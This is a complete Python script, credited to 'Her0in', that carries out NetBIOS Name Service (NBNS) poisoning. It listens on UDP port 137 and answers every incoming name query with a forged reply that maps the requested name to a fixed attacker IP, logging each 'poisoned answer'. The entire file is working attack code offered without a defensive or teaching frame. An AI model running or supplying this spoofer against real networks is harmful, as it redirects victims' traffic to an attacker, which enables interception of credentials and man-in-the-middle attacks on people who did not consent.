#!python
#/usr/bin/env python
# -*- coding:utf-8 -*-
__doc__ = """

    NBNS Answer ,
                    by Her0in

"""

import socket, struct,binascii

class NBNS_Answer:
    def __init__(self, addr):

        self.IPADDR  = addr
        self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.init_socket()
        self.populate()
    def populate(self):

        self.AnswerData = (
        b"TID"              # Transaction ID
        b"\x85\x00"         # Flags Query
        b"\x00\x00"         # Question
        b"\x00\x01"         # Answer RRS
        b"\x00\x00"         # Authority RRS
        b"\x00\x00"         # Additional RRS
        b"\x20"             # length of Name:32
        b"NAME"             # Name   
        b"\x00"             # NameNull
        b"\x00\x21"         # Query Type:NB
        b"\x00\x01"         # Class
        b"\x00\x00\x00\xa5" # TTL
        b"\x00\x06"         #
        b"\x00\x00"         # Null
        b"IPADDR")          # IP Address

    def init_socket(self):
        self.HOST = "0.0.0.0"
        self.PORT = 137
        self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)

    def decode_name(self, nbname):
        """Return the NetBIOS first-level decoded nbname."""
        if len(nbname) != 32:
            return nbname
        l = []
        for i in range(0, 32, 2):
            l.append(chr((((nbname[i]) - 0x41) << 4) |
                         (((nbname[i+1]) - 0x41) & 0xf)))
        return ''.join(l).split('\x00', 1)[0]

    def Answser(self):
        self.nas.bind((self.HOST, self.PORT))
        print("Listening...")
        while 1:
            data, addr = self.nas.recvfrom(1024)
            tid  = data[0:2]           
            name = data[13:45]
            data = self.AnswerData.replace(b'TID', tid)
            data = data.replace(b'NAME', name)
            data = data.replace(b'IPADDR', socket.inet_aton(self.IPADDR))
            print("Poisoned answer(%s) sent to %s for name %s " % (self.IPADDR, addr[0], self.decode_name(name)))
            self.nas.sendto(data, addr)
        self.nas.close()

if __name__ == "__main__":
    nbns = NBNS_Answer("192.168.6.118")
    nbns.Answser()
